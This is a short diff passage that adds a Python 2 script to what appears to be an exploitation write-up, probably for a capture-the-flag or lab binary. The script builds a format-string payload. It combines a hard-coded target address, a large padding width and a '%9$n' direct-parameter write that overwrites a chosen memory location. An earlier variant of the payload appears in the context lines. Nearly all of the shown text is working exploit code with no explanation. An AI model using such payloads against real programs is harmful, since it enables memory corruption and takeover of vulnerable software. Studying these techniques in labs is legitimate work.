@@ -28,3 +28,13 @@ OVERWRITE       = "%16930041x %n "
 
 print M_ADDR + PAD + OVERWRITE
 ```
+
+```python
+#! /usr/bin/env python
+
+M_ADDR          = "\x10\x98\x04\x08"
+OVERWRITE       = "%16930104x"
+N               = "%9$n"
+
+print M_ADDR + OVERWRITE + N
+```
